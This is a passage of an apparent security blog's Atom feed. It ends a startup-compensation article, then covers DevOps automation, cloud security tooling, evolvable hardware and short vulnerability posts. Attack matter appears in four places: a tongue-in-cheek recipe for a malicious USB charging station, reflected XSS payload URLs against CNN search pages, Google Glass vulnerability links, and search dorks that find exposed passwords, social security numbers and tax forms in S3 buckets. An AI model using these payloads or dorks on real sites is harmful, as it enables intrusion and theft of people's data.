compensation policies, it is easier to tailor salaries and benefits to
individual needs. Creativity and flexibility are at a premium.</p>

<p>Second, be thorough and systematic about analyzing the options. Compensation
and benefits plans can be expensive to design, install, administer, and
terminate. A program that is inappropriate or badly conceived can be a very
costly mistake. Startups should evaluate compensation and benefits
alternatives from four distinct perspectives.</p>

<p><em>How do they affect cash flow?</em>  Survival is the first order of business for a
new company. Even if you have raised an initial round of equity financing,
there is seldom enough working capital to go around. Research and development,
facilities and equipment, and marketing costs all make priority claims on
resources. Cash compensation must be a lower priority. Despite this awkward
tension (the desperate need to attract first-rate talent without having the
cash to pay them market rates), marshaling resources for pressing business
needs must remain paramount.</p>

<p><em>What are the tax implications?</em>  Compensation and benefits choices have major
tax consequences for a startup company and its executives; startups can use
the tax code to maximum advantage in compensation decisions. Certain
approaches, like setting aside assets to secure deferred compensation
liabilities, require that executives declare the income immediately and the
company deduct it as a current expense. Other approaches, like leaving
deferred compensation liabilities unsecured, allow executives to declare the
income later while the company takes a future deduction. Many executives value
the option of deferring taxable income more than the security of immediate
cash. And since most startups have few, if any, profits to shield from taxes,
deferring deductions may appeal to them as well.</p>

<p><em>What is the accounting impact?</em>  Most companies on their way to an initial
public offering or a sellout to a larger company must register particular
earning patterns. Different compensation programs affect the income statement
in very different ways. One service company in the startup stage adopted an
insurance-backed salary plan for its key executives. The plan bolstered the
company’s short-term cash flow by deferring salary payments (it also deferred
taxable income for those executives). But it would have meant heavy charges to
book earnings over the deferral period—charges that might have interfered with
the company’s plans to go public. So management backed out of the program at
the eleventh hour.</p>

<p><em>What is the competition doing?</em>  No startup is an island, especially when
vying for talented executives. Companies must factor regional and industry
trends into their compensation and benefits calculations. One newly
established law firm decided not to offer new associates a 401(k) plan. (This
program allows employees to contribute pretax dollars into a savings fund that
also grows tax-free. Many employers match a portion of their employees’
contributions.) The firm quickly discovered that it could not attract top
candidates without the plan; it had become a staple of the profession in that
geographic market. So it established a 401(k) and assumed the administrative
costs, but it saved money by not including a matching provision right away.</p>

<p>Events at a Boston software company illustrate the potential for flexibility
in startup compensation. The company’s three founders had worked together at a
previous employer. They had sufficient personal resources to contribute assets
and cash to the new company in exchange for founders’ stock. They decided to
forgo cash compensation altogether for the first year.</p>

<p>Critical to the company’s success were five software engineers who would write
code for the first product. It did not make sense for the company to raise
venture capital to pay the engineers their market-value salaries. Yet their
talents were essential if the company were to deliver the software on time.</p>

<p>The obvious solution: supplement cash compensation with stock. But two
problems arose. The five prospects had unreasonably high expectations about
how much stock they should receive. Each demanded 5% to 10% of the company,
which, if granted, would have meant transferring excessive ownership to them.
Moreover, while they were equal in experience and ability and therefore worth
equal salaries, each had different cash requirements to meet their obligations
and maintain a reasonable life-style. One of the engineers was single and had
few debts; he was happy to go cash-poor and bank on the company’s growth. One
of his colleagues, however, had a wife and young child at home and needed the
security of a sizable paycheck.</p>

<p>The founders devised a solution to meet the needs of the company and its
prospective employees. They consulted other software startups and documented
that second-tier employees typically received 1% to 3% ownership stakes. After
some negotiation, they settled on a maximum of 2% for each of the five
engineers. Then they agreed on a formula by which these employees could trade
cash for stock during their first three years. For every $1,000 in cash an
engineer received over a base figure, he or she forfeited a fixed number of
shares. The result: all five engineers signed on, the company stayed within
its cash constraints, and the founders gave up a more appropriate 7% of the
company’s equity.</p>

<h2 id="cash-vs-stock">Cash vs. Stock</h2>

<p>Equity is the great compensation equalizer in startup companies—the bridge
between an executive’s market value and the company’s cash constraints. And
there are endless variations on the equity theme: restricted shares, incentive
stock options, nonqualified options, stock appreciation rights (SARs), phantom
stock, and the list goes on. This dizzying array of choices notwithstanding,
startup companies face three basic questions. Does it make sense to grant key
executives an equity interest? If so, should the company use restricted stock,
options, or some combination of both? If not, does it make sense to reward
executives based on the company’s appreciating share value or to devise
formulas based on different criteria?</p>

<p>Let’s consider these questions one at a time. Some company founders are
unwilling to part with much ownership at inception. And with good reason.
Venture capitalists or other outside investors will demand a healthy share of
equity in return for a capital infusion. Founders rightly worry about diluting
their control before obtaining venture funds.</p>

<p>Alternatives in this situation include SARs and phantom shares—programs that
allow key employees to benefit from the company’s increasing value without
transferring voting power to them. No shares actually trade hands; the company
compensates its executives to reflect the appreciation of its stock. Many
executives prefer these programs to outright equity ownership because they
don’t have to invest their own money. They receive the financial benefits of
owning stock without the risk of buying shares. In return, of course, they
forfeit the rights and privileges of ownership. These programs can get
complicated, however, and they require thorough accounting reviews. Reporting
rules for artificial stock plans are very restrictive and sometimes create
substantial charges against earnings.</p>

<p>Some founders take the other extreme. In the interest of saving cash, they
award bits of equity at every turn. This can create real problems. When it
comes to issuing stock, startups should always be careful not to sell the
store before they fill the shelves. That is, they should award shares to key
executives and second-tier employees in a way that protects the long-term
company interest. And these awards should take place only after the company
has fully distributed stock to the founders.</p>

<p>The choice of whether to issue actual or phantom shares should also be
consistent with the company’s strategy. If the goal is to realize the “big
payoff” within three to five years through an initial public offering or
outright sale of the company, then stock may be the best route. You can
motivate employees to work hard and build the company’s value since they can
readily envision big personal rewards down the road.</p>

<p>The founder of a temporary employment agency used this approach to attract and
motivate key executives. He planned from the start to sell the business once
it reached critical mass, and let his key executives know his game plan. He
also allowed them to buy shares at a discount. When he sold the business a few
years later for $10 million, certain executives, each of whom had been allowed
to buy up to 4% of the company, received as much as $400,000. The lure of
cashing out quickly was a great motivator for this company’s top executives.</p>

<p>For companies that plan to grow more slowly over the first three to five
years, resist acquisition offers, and maintain private ownership, the stock
alternative may not be optimal. Granting shares in a company that may never be
sold or publicly traded is a bit like giving away play money. Worthless paper
can actually be a demotivator for employees.</p>

<p>In such cases, it may make sense to create an artificial market for stock.
Companies can choose among various book-value plans, under which they offer to
buy back shares issued to employees according to a pricing formula. Such plans
establish a measurement mechanism based on company performance—like book
value, earnings, return on assets or equity—that determines the company’s per-
share value. As with phantom shares and SARs, book-value plans require a
thorough accounting review.</p>

<p>If a company does decide to issue shares, the next question is how to do it.
Restricted stock is one alternative. Restricted shares most often require that
an executive remain with the company for a specified time period or forfeit
the equity, thus creating “golden handcuffs” to promote long-term service. The
executive otherwise enjoys all the rights of other shareholders, except for
the right to sell any stock still subject to restriction.</p>

<p>Stock options are another choice, and they generally come in two forms:
incentive stock options (ISOs) and nonqualified stock options (NSOs). As with
restricted shares, stock options can create golden handcuffs. Most options,
whether ISOs or NSOs, involve a vesting schedule. Executives may receive
options on 1,000 shares of stock, but only 25% of the options vest (i.e.,
executives can exercise them) in any one year. If an executive leaves the
company, he or she loses the unexercised options. Startups often prefer ISOs
since they give executives a timing advantage with respect to taxes.
Executives pay no taxes on any capital gains until they sell or exchange the
stock, and then only if they realize a profit over the exercise price. ISOs,
however, give the company no tax deductions—which is not a major drawback for
startups that don’t expect to earn big profits for several years. Of course,
if companies generate taxable income before their executives exercise their
options, lack of a deduction is a definite negative.</p>

<p>ISOs have other drawbacks. Tax laws impose stiff technical requirements on how
much stock can be subject to options, the maximum exercise period, who can
receive options, and how long stock must be held before it can be sold.
Moreover, the exercise price of an ISO cannot be lower than the fair market
value of the stock on the date the option is granted. (Shares need not be
publicly traded for them to have a fair market value. Private companies
estimate the market value of their stock.)</p>

<p>For these and other reasons, companies usually issue NSOs as well as ISOs.
NSOs can be issued at a discount to current market value. They can be issued
to directors and consultants (who cannot receive ISOs) as well as to company
employees. And they have different tax consequences for the issuing company,
which can deduct the spread between the exercise price and the market price of
the shares when the options are exercised.</p>

<p>NSOs can also play a role in deferred compensation programs. More and more
startups are following the lead of larger companies by allowing executives to
defer cash compensation with stock options. They grant NSOs at a below-market
exercise price that reflects the amount of salary deferred. Unlike standard
deferral plans, where cash is paid out on some unalterable future date (thus
triggering automatic tax liabilities), the option approach gives executives
control over when and how they will be taxed on their deferred salary. The
company, meanwhile, can deduct the spread when its executives exercise their
options.</p>

<p>One small but growing high-tech company used a combination of stock techniques
to achieve several compensation goals simultaneously. It issued NSOs with an
exercise price equal to fair market value (most NSOs are issued at a
discount). All the options were exercisable immediately (most options have a
vesting schedule). Finally, the company placed restrictions on the resale of
stock purchased with options.</p>

<p>This program allowed for maximum flexibility. Executives with excess cash
could exercise all their options right away; executives with less cash, or who
wanted to wait for signs of the company’s progress, could wait months or years
to exercise. The plan provided the company with tax deductions on any options
exercised in the future (assuming the fair market value at exercise exceeded
the stock’s fair market value when the company granted the options) and
avoided any charges to book earnings in the process. And the resale
restrictions created golden handcuffs without forcing executives to wait to
buy their shares.</p>

<h2 id="the-benefits-challenge">The Benefits Challenge</h2>

<p>No startup can match the cradle-to-grave benefits offered by employers like
IBM or General Motors, although young companies may have to attract executives
from these giant companies. It is also true, however, that the executives most
attracted to startup opportunities may be people for whom standard benefit
packages are relatively unimportant. Startup companies have special
opportunities for creativity and customization with employee benefits. The
goal should not be to come as close to what IBM offers without going broke,
but to devise low-cost, innovative programs that meet the needs of a small
employee corps.</p>

<p>Of course, certain basic needs must be met. Group life insurance is important,
although coverage levels should start small and increase as the company gets
stronger. Group medical is also essential, although there are many ways to
limit its cost. Setting higher-than-average deductibles lowers employer
premiums (the deductibles can be adjusted downward as financial stability
improves). Self-insuring smaller claims also conserves cash. One young company
saved 25% on its health-insurance premiums by self-insuring the first $500 of
each claim and paying a third party to administer the coverage.</p>

<p>The list of traditional employee benefits doesn’t have to stop here—but it
probably should. Most companies should not adopt long-term disability
coverage, dental plans, child-care assistance, even retirement plans, until
they are well beyond the startup phase. This is a difficult reality for many
founders to accept, especially those who have broken from larger companies
with generous benefit programs. But any program has costs—and costs of any
kind are a critical worry for a new company trying to move from the red into
the black. Indeed, one startup in the business of developing and operating
progressive child-care centers wisely decided to wait for greater financial
stability before offering its own employees child-care benefits.</p>

<p>Many young companies underestimate the money and time it takes just to
administer benefit programs, let alone fund them. Employee benefits do not run
on automatic pilot. While the vice president of marketing watches marketing,
the CFO keeps tabs on finances, and the CEO snuffs out the fires that always
threaten to engulf a young company, who is left to mind the personnel store?
If a substantial benefits program is in place, someone has to handle the day-
to-day administrative details and update the program as the accounting and tax
rules change. The best strategy is to keep benefits modest at first and make
them more comprehensive as the company moves toward profitability.</p>

<p>Which is not to suggest that the only answer to benefits is setting strict
limits. Other creative policies may not only cost less but they also may
better suit the interests and needs of executive recruits. Take company-
supplied lunches. One startup computer company thought it was important to
create a “think-tank” atmosphere. So it set up writing boards in the
cafeteria, provided all employees with daily lunches from various ethnic
restaurants, and encouraged spirited noontime discussions.</p>

<p>Certainly, Thai food is no substitute for a generous pension. But benefits
that promote a creative and energetic office environment may matter more to
employees than savings plans whose impact may not be felt for decades. One
startup learned this lesson after it polled its employees. It was prepared to
offer an attractive—and costly—401(k) program until a survey disclosed that
employees preferred a much different benefit: employer-paid membership at a
local health club. The company gladly obliged.</p>

<p>Deciding on compensation policies for startup companies means making tough
choices. There is an inevitable temptation, as a company shows its first signs
of growth and financial stability, to enlarge salaries and benefits toward
market levels. You should resist these temptations. As your company heads
toward maturity, so can your compensation and benefits programs. But the
wisest approach is to go slowly, to make enhancements incrementally, and to be
aware at all times of the cash flow, taxation, and accounting implications of
the choices you face.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="startup compensation"/>
    <category term="equity compensation"/>
    <category term="executive recruitment"/>
    <category term="venture capital"/>
    <category term="cash vs stock compensation"/>
    <category term="benefits program"/>
    <category term="stock options"/>
    <category term="employee motivation"/>
    <category term="startup challenges"/>
    <category term="creative compensation strategies"/>
    <category term="benefits customization"/>
    <summary type="html"><![CDATA[You]]></summary>
  </entry>
  <entry>
    <title type="html">Malicious mobile power station</title>
    <link href="https://www.securesql.info/2013/06/05/mobile-power-station/" rel="alternate" type="text/html" title="Malicious mobile power station"/>
    <published>2013-06-05T00:00:00-07:00</published>
    <updated>2013-06-05T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/06/05/mobile-power-station</id>
    <content type="html" xml:base="https://www.securesql.info/2013/06/05/mobile-power-station/"><![CDATA[<p>A bit back, I looked over <a href="https://media.blackhat.com/bh-dc-11/Stavrou-
Wang/BlackHat_DC_2011_Stavrou_Zhaohui_USB_exploits-wp.pdf">Stavrou’s USB smartphone
paper</a>.  Interesting
research.  Well done.   All one needs to do is take a tacticle jacket,
malicious usb-enabled laptop, spraypaint a large, trustworthy brand name, then
head to your local concert venue.  If one is paranoid about victims stealing
the USB cords, epoxy the cords to your ports.  While walking around the venue,
look for those on their phone.  Once discovered, ask them if they would like a
free charge.   Before you know it, you will look like the following;</p>

<p><img src="https://securesql.info/images/USBPowerHack.png.avif" alt="" /></p>

<p>Easy as apple pie.</p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="USB security vulnerabilities"/>
    <category term="smartphone security"/>
    <category term="malicious USB attacks"/>
    <category term="Stavrou's research"/>
    <category term="cybersecurity threats"/>
    <category term="social engineering"/>
    <summary type="html"><![CDATA[A bit back, I looked over Stavrou USB smartphone paper evil power station]]></summary>
  </entry>
  <entry>
    <title type="html">Lazy AWS devops</title>
    <link href="https://www.securesql.info/2013/06/04/want-a-simple-way-to-keep-your-cloudy-big-data-private-at-little-cost/" rel="alternate" type="text/html" title="Lazy AWS devops"/>
    <published>2013-06-04T00:00:00-07:00</published>
    <updated>2013-06-04T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/06/04/want-a-simple-way-to-keep-your-cloudy-big-data-private-at-little-cost</id>
    <content type="html" xml:base="https://www.securesql.info/2013/06/04/want-a-simple-way-to-keep-your-cloudy-big-data-private-at-little-cost/"><![CDATA[<p>I am seeing too much echo chamber, saber rattling, foolish dogma about agile
SA / devops. “Just use <insert configuration="" tool="" name="" here.="">  All of your
problems will be solved.” Yeah, right. And Unicorns talk to virgins. DevOps
setup isn’t simple. One will need to think about a different paradigm. As a
result, one’s mindset will change.  For better and worse, one will slowly
morph into the Bastard Operator from Hell.</insert></p>

<p>Scenario time: a tornado takes out your data center. Or if you were at Google
last year, aliens land and take over the United States. You are at the
symphony. Don’t worry! Good thing you have an AWS EC2 account ready to bring
up Production DR and IT-based BC.</p>

<ul>
  <li>• Send an email to <a href="mailto:godmode@securesql.info">godmode@securesql.info</a> with the subject: thundercats go!</li>
  <li>• The Bootstrapping automation provisions new instances.</li>
  <li>• Configuration takes over and ensures the instances are compliant with the golden standards and application settings.</li>
  <li>• At the same time, Configuration updates Monitoring and Orchestration.</li>
  <li>• Monitoring works with Orchestration to start services and ensure the system is operating as designed. If additional machines are needed, Bootstrapping brings up additional systems.</li>
  <li>• When the load decreases, Monitoring works with Orchestration to terminate instances.</li>
</ul>

<p>All accomplished without a touch of the keyboard or service.  Back to wrapping
your arm around your date @ the symphony.</p>

<p>If you want to read more about each layer, continue reading… If not, go
outside and enjoy a beer.</p>

<p>The first layer is bootstrapping. Traditional practice, one would file a
ticket with the DC techs to rack the new machine. The DC techs would rack,
cable, and power on the asset. The machine would PXE boot to grab the image to
the system via ftp and / or tftp. Such a pain. This procedure would take 2-3
hours for each machine. One could get 20-30 machines up in parallel. Maybe
much less if one could get the systems pre-imaged from the hardware vendor.
Too much time and effort wasted. With newer SA methods, boot strapping can be
accomplished in less than 5 minutes. Pick one’s infrastructure as a service.
Scalr, GoGrid, AWS EC2, Rackspace Cloud, OpenQRM, and Engine Yard come to
mind. Grab ruby’s fog gem or the vendor’s toolkit. If you are feeling sassy,
utilize a build system such as Jenkins, or Buildbot. Grab your api keys from
your IaaS vendor. Place the credentials in the toolkit. Then put the
automation script in the build system or run it from command line. The script
below would utilize Fog for EC2 to bootstrap a pre-configured, low powered,
logical machine.</p>

<blockquote>
  <p>#!/usr/bin/ruby</p>

  <p>require ‘rubygems’</p>

  <p>require ‘fog’</p>

  <p>require ‘./secrets.rb’</p>

  <p>cloud =
Fog::AWS::EC2.new(:aws_access_key_id=&gt;@aws_access_key_id,:aws_secret_access_key=&gt;@aws_secret_access_key
)</p>

  <p>server = cloud.servers.create(:image_id =&gt; ‘ami-323’, :flavor_id =&gt;
‘m1.small’)</p>

  <p>puts “Private IP: #{server.private_ip_address}”</p>

  <p>puts “Public IP: #{server.ip_address}”</p>
</blockquote>

<p>Nifty, now you have a machine running. But you have to take it your methods to
the next level and configure it to the tasked assigned to you. You can login
to the machine, manually configure packages, settings, and test the system for
assurance and compliance. If you are lucky, you would have written script
automation to handle this for you. Most likely, you haven’t nor would you
periodically run those scripts the machine. Over time, everything will not
look the same. As the number of systems increase, it becomes harder to manage.
Utilizing configuration tools such as Chef, Puppet, CFEngine, or BCFG2, one
can ask the machines “AM I like the standard image?” When they do not, and
they will, the tool will alert and automatically correct the issue. It is a
manageable problem. Completely hands-off. Now I wouldn’t go so far to say this
tool automation solves your needs. You will have Three Mile Island cascading
failures.</p>

<p>Congrats, one has their application running on their logical asset. But wait,
Product needs to reconfigure the application service to fix a bug. Many will
blindly apply the change across all systems in a rolling fashion.
Orchestration by blind faith is great, but will fall short. Capistrano,
Mcollective, ControlTier, or IronFan are great tools to use in this effect.
Not everyone can acquire Yahoo’s Limo. Orchestrate the organization’s
processes and procedures into a frankenstein tool. For instance, when I bring
a new Cassandra node online, I use the following code:</p>

<blockquote>
  <p>announce(:cassandra, :server, :compliance)</p>

  <p>neighbors = discover_all(:cassandra, :server, :compliance).map(&amp;:private_ip)</p>

  <p>nodes = &lt;%= neighbors.join(‘,’) %&gt;</p>
</blockquote>

<p>Configure monitoring to know the good state and health of the service(s.) Then
have monitoring integrated with orchestration and boot strapping to provision
/ deprovision instances until the entire data center is running at an optimal
level. Monit, Munin, and Nagios come to mind.</p>

<p>An amazing benefit from utilizing the modern methods above is that one’s
infrastructure heals itself and doesn’t depend on a single failure.</p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="DevOps"/>
    <category term="agile SA"/>
    <category term="cloud security tools"/>
    <category term="automation in IT"/>
    <category term="AWS EC2"/>
    <category term="orchestration tools"/>
    <category term="configuration management"/>
    <category term="Chef"/>
    <category term="Puppet"/>
    <category term="BCFG2"/>
    <category term="Capistrano"/>
    <category term="Mcollective"/>
    <category term="data center management"/>
    <category term="infrastructure as a service"/>
    <category term="disaster recovery"/>
    <category term="system monitoring"/>
    <summary type="html"><![CDATA[I am seeing too much echo chamber, saber rattling, foolish dogma about agile SA]]></summary>
  </entry>
  <entry>
    <title type="html">Security is hard. Security Tools are harder. Cloud Security Tools are hardest.</title>
    <link href="https://www.securesql.info/2013/05/09/cloudsec-jitiam/" rel="alternate" type="text/html" title="Security is hard. Security Tools are harder. Cloud Security Tools are hardest."/>
    <published>2013-05-09T00:00:00-07:00</published>
    <updated>2013-05-09T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/05/09/cloudsec-jitiam</id>
    <content type="html" xml:base="https://www.securesql.info/2013/05/09/cloudsec-jitiam/"><![CDATA[<p>There are tools, security tools, and then there are cloud security tools.
Especially in the realm of security orchestration.  Many cloud snake oil tools
were never designed for the cloud.  See RSA three years ago to today when a
vendor slapped cloud on their marketing material for pre-existing on-premise
software.  Or better yet:  They took their CFEngine and applied it to all of
their customer’s AWS instances.  A great example are the vulnerability
managers / scanners.   Setup a DNS hostname or IP to scan.  Then the
vulnerability “management” portion of the scanner will track the DNS / IP with
metadata about the machine.  But what about when the IP or DNS name changes to
a different IP / DNS hostname, but the machine instance stays the same? Many
service-based security tools pricing structure are based upon some idea of a
static concept (IP address, DNS entry, etc…)  So imagine an infrastructure
where new machines are created and destroyed every few minutes.  It will get
quite expensive.  Not to mention, the vulnerability / GRC management software
doesn’t have the concept of a machine instance jumping around the
infrastructure with different IPs / DNS names but still representing the same
machine scanned moments earlier.  Well, their business model understands this
concept and it means more licenses and billable expenses.  This is assuming
you are able to scan instances which exist for a few minutes then are
terminated; you did solve that problem, right?</p>

<p>Very few cloud snake oil tools have any type of API or programmatic interface
by which to interact with the service or tool.  Imagine if you wanted to
correlate information on everyone piggybacking into your office.  A simple
correlation involves seeing who didn’t swipe into the office but logged on
locally to the office networked machine.  If you had to resort to scraping the
building access system to get your swipes, then it doesn’t have an API or
programmatic interface.  One would expect to see start, stop, restart, running
status, credential management, alerting, reporting, auditing, etc….</p>

<p>One’s mileage on the time it will take to construct / destroy the cloud
security orchestration tool.  For many software-based tools, it will require a
complex host or network agent.  Look at the build complexity required to run
Chef: MongoDB, Solr, Rails, Ruby, etc…  Best case, the tool will require
credentials or be at some trusted point in the architecture.  This is where
orchestration tools will succeed.  Once you can do it for another environment,
it is simple to transition the orchestration to the new environment.  Assuming
one is building a mirror of their other environment.</p>

<p>While interoperability will always be an issue with security tools,
orchestration is another beast.  Rarely, one will find one tool to natively
interoperate with others.  Hence the business need for Bromium, Cloud Passage,
High Cloud Security, HyTrust, and other cloud security corporations.  Ask
yourself does your cloud security tool have the ability to push / pull
information from your Arc Sight instance, correlate with Splunk’s output, push
into your GRC tool, pull the latest scan from Qualys, maintain policy
compliance, and push out signatures to your Imperva instances?  How about a
simpler question:  How will you pull your puppet / chef logs from Splunk or
OSSEC and correlate with one’s security checklist automation documentation to
verify what one is seeing is a policy violation or an intrusion?  By the way,
the asset which caused the violation is now destroyed by your orchestration
software.  I hope your incident response team understands how to investigate
cloud instances and be able to perform forensic investigations.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="cloud security tools"/>
    <category term="security orchestration"/>
    <category term="vulnerability management"/>
    <category term="dynamic infrastructure"/>
    <category term="cloud service APIs"/>
    <category term="security tool interoperability"/>
    <category term="cloud security corporations"/>
    <category term="policy compliance"/>
    <category term="incident response"/>
    <category term="forensic investigations"/>
    <summary type="html"><![CDATA[There are tools, security tools, and then there are cloud security tools. Especially in the realm of security orchestration. Many cloud snake oil tools were never designed for the cloud.]]></summary>
  </entry>
  <entry>
    <title type="html">CNN.com XSS vulnerabilities</title>
    <link href="https://www.securesql.info/2013/05/06/cnn-xss/" rel="alternate" type="text/html" title="CNN.com XSS vulnerabilities"/>
    <published>2013-05-06T00:00:00-07:00</published>
    <updated>2013-05-06T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/05/06/cnn-xss</id>
    <content type="html" xml:base="https://www.securesql.info/2013/05/06/cnn-xss/"><![CDATA[<p>CNN fixed two XSS issues.  Congrats!  Only took them a few quarters :\</p>

<p><a href="http://edition.cnn.com/search/index.html?sortBy=date&amp;primaryType=mixed&amp;source=money&amp;query=%22%3E%3Ciframe+onload%3Dalert%28%2FXSS%2F%29%3E">http://edition.cnn.com/search/index.html?sortBy=date&amp;primaryType=mixed&amp;am…</a></p>

<p><a href="http://money.cnn.com/search/index.html?sortBy=date&amp;primaryType=mixed&amp;source=money&amp;query=%22%3E%3Ciframe+onload%3Dalert%28%2FXSS%2F%29%3E">http://money.cnn.com/search/index.html?sortBy=date&amp;primaryType=mixed&amp;…</a></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="CNN"/>
    <category term="XSS issues"/>
    <category term="security updates"/>
    <category term="web security"/>
    <category term="vulnerability fixes"/>
    <summary type="html"><![CDATA[CNN fixed two XSS issues. Congrats]]></summary>
  </entry>
  <entry>
    <title type="html">Google Glass Developer program - more DOS and XSS</title>
    <link href="https://www.securesql.info/2013/05/03/more-google-glass-vulns/" rel="alternate" type="text/html" title="Google Glass Developer program - more DOS and XSS"/>
    <published>2013-05-03T00:00:00-07:00</published>
    <updated>2013-05-03T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/05/03/more-google-glass-vulns</id>
    <content type="html" xml:base="https://www.securesql.info/2013/05/03/more-google-glass-vulns/"><![CDATA[<p>There were two very simple Google Glass Mirror’s quickstart DOS and XSS
vulnerabilities.  The fixes have been introduced in changeset
https://github.com/googleglass/mirror-quickstart-
java/commit/738352eb5b5b73aa7bb911d0aeee3386f40dbf26</p>

<p>​</p>

<p>​The DOS fix is rather simple.  Limit the request to 1000 lines.  The XSS fix
is hackish but works.  Instead of reflecting the client’s input back to the
user, the error is directed to the error logging infrastructure.  Let’s hope
the error logging infrastructure is anti-XSS enabled.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Google Glass"/>
    <category term="Mirror API"/>
    <category term="DOS vulnerability"/>
    <category term="XSS vulnerability"/>
    <category term="security fixes"/>
    <category term="GitHub changeset"/>
    <category term="error handling"/>
    <category term="code security"/>
    <category term="vr insecurity"/>
    <category term="ar vulnerability"/>
    <category term="augmented reality vulnerability"/>
    <summary type="html"><![CDATA[There were two very simple Google Glass Mirror's quickstart DOS and XSS vulnerabilities. The fixes have been introduced in changeset https]]></summary>
  </entry>
  <entry>
    <title type="html">Google Glass 0days</title>
    <link href="https://www.securesql.info/2013/04/19/google-glass-vulns/" rel="alternate" type="text/html" title="Google Glass 0days"/>
    <published>2013-04-19T00:00:00-07:00</published>
    <updated>2013-04-19T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/04/19/google-glass-vulns</id>
    <content type="html" xml:base="https://www.securesql.info/2013/04/19/google-glass-vulns/"><![CDATA[<p>Jenny Murphy has some clean code.  However, it isn’t the most secure.  The
Google Glass team must be under an intense timeline.  Without looking too hard
into the libraries and open source code, there are 22+ vulnerabilities.
Everything from DOS to reflected XSS.  I was hoping for a stronger SDL. ​</p>

<p>Until the issues have gone through Responsible Disclosure, one can review the
code @ https://developers.google.com/glass/overview</p>

<p>https://github.com/googleglass/mirror-quickstart-php/commit/215374669072a8b788df464434f923bdc5f4e8e4</p>

<p>https://github.com/googleglass/mirror-quickstart-java/blob/fcdd3e48dfca4f4c3fcbe5e368683ca32b3e9720/src/main/java/com/google/glassware/NotifyServlet.java#L72</p>

<p>https://github.com/googleglass/mirror-quickstart-go/commit/0d33b01b6557ab7bcdba83022c6e729912ee2275</p>

<p>https://github.com/googleglass/gdk-level-sample/commit/2fab0d65f187a4b395ed4903ecf0023a516f8455</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Google Glass"/>
    <category term="software development lifecycle"/>
    <category term="vulnerabilities"/>
    <category term="DOS attacks"/>
    <category term="reflected XSS"/>
    <category term="code security"/>
    <category term="open source code"/>
    <category term="responsible disclosure"/>
    <category term="vr insecurity"/>
    <category term="ar vulnerability"/>
    <category term="augmented reality vulnerability"/>
    <summary type="html"><![CDATA[Jenny Murphy has some clean code. However, it isn't the most secure. The Google Glass team must be under an intense timeline. Without looking too hard into the libraries and]]></summary>
  </entry>
  <entry>
    <title type="html">Evolutionary hardware</title>
    <link href="https://www.securesql.info/2013/04/17/for-technical-problems-one-may-struggle-to-define/" rel="alternate" type="text/html" title="Evolutionary hardware"/>
    <published>2013-04-17T00:00:00-07:00</published>
    <updated>2013-04-17T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/04/17/for-technical-problems-one-may-struggle-to-define</id>
    <content type="html" xml:base="https://www.securesql.info/2013/04/17/for-technical-problems-one-may-struggle-to-define/"><![CDATA[<p>For technical problems, one may struggle to define the specifications. When
this happens, look at the behavioral design. Then one may find solutions from
the design automation. Thankfully, evolution algorithms are a class of “soft
computing” techniques which handles poor specifications. One will encounter
direct application of the evolutionary algorithms via Neural networks,
ReCaptcha, and / or Amazon Turk.  All which have been applied to solve noisy
pattern recognition.</p>

<p>​</p>

<p>View fullsize</p>

<p><img src="https://securesql.info/images/1-s2.0-S0031320312002439-gr9.jpg" alt="" /></p>

<p>Evolvable hardware techniques have important advantages over neural networks.
Hardware is really fast and are more easily understood / implemented than
neural networks with fast operations and solution tractability. For these
purposes, evolvable hardware has been developed for academic, military and
industrial applications. So let’s borrow from them instead of reinventing the
wheel.</p>

<p>With appropriate automation, evolvable hardware has a large potential to
autonomously adapt to the constantly changing risk environment. This is
extremely useful for situations where (real-time approaches nano-seconds) over
systems is improbable / impossible. It doesn’t hurt evolvable hardware is
useful when harsh or unexpected data points, threats, vulnerabilities, risks,
and other conditions are encountered.</p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="evolutionary algorithms"/>
    <category term="soft computing"/>
    <category term="design automation"/>
    <category term="neural networks"/>
    <category term="ReCaptcha"/>
    <category term="Amazon Turk"/>
    <category term="pattern recognition"/>
    <category term="evolvable hardware"/>
    <category term="military applications"/>
    <category term="industrial applications"/>
    <category term="risk management"/>
    <summary type="html"><![CDATA[For technical problems, one may struggle to define the specifications. When this happens, look at the behavioral design. Then one may find solutions from the design automation. Thankfully, evolution algorithms]]></summary>
  </entry>
  <entry>
    <title type="html">Rapid7 Google hacks extended</title>
    <link href="https://www.securesql.info/2013/04/11/site-s3-amazonaws-com-filetype-docx-password-username/" rel="alternate" type="text/html" title="Rapid7 Google hacks extended"/>
    <published>2013-04-11T00:00:00-07:00</published>
    <updated>2013-04-11T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2013/04/11/site-s3-amazonaws-com-filetype-docx-password-username</id>
    <content type="html" xml:base="https://www.securesql.info/2013/04/11/site-s3-amazonaws-com-filetype-docx-password-username/"><![CDATA[<p>site:s3.amazonaws.com filetype:docx password username</p>

<p>site:s3.amazonaws.com filetype:pdf password username</p>

<p>site:s3.amazonaws.com filetype:pdf social security number confidential</p>

<p>site:s3.amazonaws.com “Form W-4”​</p>

<p>site:s3.amazonaws.com “Form W-9”​​</p>

<p>site:s3.amazonaws.com “Form 1099”</p>

<p>How many other file sharing services are affected by the inadvertant sharing
of sensitive information?  I suspect there are many.  And the results will not
be noisey.    Or better yet: Content delivery networks.</p>

<p>​</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="data leakage"/>
    <category term="S3 bucket security"/>
    <category term="sensitive information"/>
    <category term="file sharing services"/>
    <category term="content delivery networks"/>
    <category term="inadvertent sharing"/>
    <category term="document security"/>
    <category term="Form W-4"/>
    <category term="Form W-9"/>
